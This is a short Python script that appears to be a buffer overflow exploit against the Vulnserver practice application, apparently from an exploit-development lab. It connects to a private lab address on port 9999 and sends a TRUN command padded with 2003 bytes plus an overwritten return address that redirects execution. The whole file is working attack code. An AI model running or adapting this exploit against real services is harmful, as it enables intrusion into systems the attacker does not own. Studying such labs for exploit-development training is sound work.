#!/usr/bin/python3

import sys, socket
from time import sleep

# 625011af
shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" # x86 architecture, little endian

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.1.101',9999))

	payload = b"TRUN /.:/" + shellcode

	s.send(payload)
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()